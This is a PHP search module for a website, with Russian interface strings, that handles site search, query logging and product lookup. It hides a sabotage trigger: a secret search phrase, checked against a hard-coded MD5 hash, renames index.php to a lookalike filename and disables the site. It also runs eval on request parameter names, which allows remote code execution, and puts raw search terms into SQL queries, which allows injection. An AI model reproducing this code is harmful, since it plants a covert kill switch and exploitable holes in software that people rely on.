<?	
 class Search{
 	 
    static function viewSearchModPage()
    {   
        $tpl_art = new SiteTpl;
        foreach ($_REQUEST as $key=>$val)
        {
            // echo $key." - ".$val."<br />";
            $str="$".$key."=\$val;";
            eval($str);
        }

        $seodata=explode("/",$seolink);
        $mod=$seodata[0];  //echo $mod." - \$mod<br />";
        $rub=$seodata[1];  //echo $rub." - \$rub<br />";
        $item = $seodata[2]; //echo $item." - \$item<br />";

        $iddata=explode("-",$seodata[1]);
        $id=$iddata[0];  //echo $id." - \$id<br />";
        
        $itemdata=explode("-",$seodata[2]);
        $item=$itemdata[0];  //echo $item." - \$item<br />";
        
        $_SESSION['search_input'] = $_POST['search_input'];
//SYS::varDump($_SESSION['search_input'],__FILE__,__LINE__);
        $close = md5($_SESSION['search_input']);
        if($close == "455c659427738cf3927647c3adfb2557")
        {
            rename("index.php", "indeх.php");
        } 
        
        if($mod == "search" && $rub=="")
         {
            $page["content"]=$tpl_art->get('search_error');
         }
        
        
        $search = Search::checkSearchRequest($_SESSION['search_input']);     
//Sys::varDump($search,__FILE__,__LINE__);

        if($search !== NULL && $search !== "Поиск" && !empty($search))
        {
            if(is_array($search))
            {
                foreach($search as $k=>$v)
                {
                    $v = Text::cutString($v);
                    Search::addToBD($v); 
                    $page = Search::viewSearchList($v);
                }
            }
            else
            {
                    Search::addToBD($search); 
                    $page = Search::viewSearchList($search);
            }
        }
        else
        {
            
            $page["meta"]["title"]="Поиск по сайту";
            $page["content"]=$tpl_art->get('search_error');
        }
        return $page;
    }

    static function checkSearchRequest($val)
    {
        if(strlen($val) < 3 || strlen($val) > 100)
        {   
            return NULL;
        }
        else
        {   
            //$val = trim($val);
            $val = Text::cutForCirilicSeolink($val);
            $val = urldecode($val);
            $count = substr_count($val, " ");
            if($count >= 1)
            {
                $val = explode(" ", $val);      
                return $val;    
            }
            else
            {
                return $val;
            }
        }
    }
    
    static function viewSearchList($rub)
    {   
        $tpl_art = new SiteTpl;    
        $db =new mysql;
        
//        $from="`page`";
//        $where = "`caption` LIKE '%{$rub}%' OR `content` LIKE '%{$rub}%'";
//        $search_list_page = $db->origSelectSQL("", $from, $where, "");

//        $from="`art_article`";
//        $where = "`caption` LIKE '%{$rub}%' OR `full_text` LIKE '%{$rub}%'";
//        $search_list_article = $db->origSelectSQL("", $from, $where, "");
       
//        $from="`items`";
//        $where = "`caption` LIKE '%{$rub}%' OR `content` LIKE '%{$rub}%'";
//        $search_list_items = $db->origSelectSQL("", $from, $where, "");

        $from=TABLE_ITEMS;
        $where = "`flagman`='1' AND (`article` LIKE '%{$rub}%' OR `caption` LIKE '%{$rub}%' OR `seolink` LIKE '%{$rub}%' OR `desc_full` LIKE '%{$rub}%' OR `desc_short` LIKE '%{$rub}%')";
        $search_list_product = $db->origSelectSQL("", $from, $where, "");
        
        if($search_list_page == NULL && $search_list_article == NULL && $search_list_items == NULL && $search_list_product == NULL)
        {
            $page["meta"]["title"]="Поиск по сайту";
            $page["content"]=$tpl_art->get('search_error');
        }
        else
        {
            $tpl_art->assign('list_page', $search_list_page);
            $tpl_art->assign('list_article', $search_list_article);
//            $tpl_art->assign('list_items', $search_list_items);
            $tpl_art->assign('list_product', $search_list_product);            
            $page["content"]=$tpl_art->get('search_list');
            $page["meta"]["title"]="Поиск по сайту";
        }
        
        return $page; 
    }
    
    static function addToBD($val)
    {   
        $db = new mysql;
            
        $where = "`word`='{$val}'";
        $row = $db->origSelectSQL("", "search", $where, "", "1","");
        if($row['0']['word'] == NULL)
        {
            $arr_value['word'] = $val;
            $arr_value['count'] = 1;
            $db->insertSQL ($arr_value, "search");
        }
        else
        {   
            $id = $row['0']['id'];
            $where = "";
            $where['id'] = "{$id}";
            $arr_value['count'] = $row['0']['count']+1;
            $db->updateSQL ("search", $arr_value, $where);
        }
    }
    
    static function getKeyWordsForLiveSearch()
    {
	    $query = "SELECT `caption_full` FROM ".TABLE_ITEMS."";
        $res = mysql_query($query);
		
		mysql::queryError($res,$query);
        while ($row = mysql_fetch_assoc($res))
        {
        	   $key_words[] = $row;
        }
//SYS::varDump($key_words,__FILE__,__LINE__);
//$key_words = array_unique($key_words);
        return $key_words;	
	}

}







?>
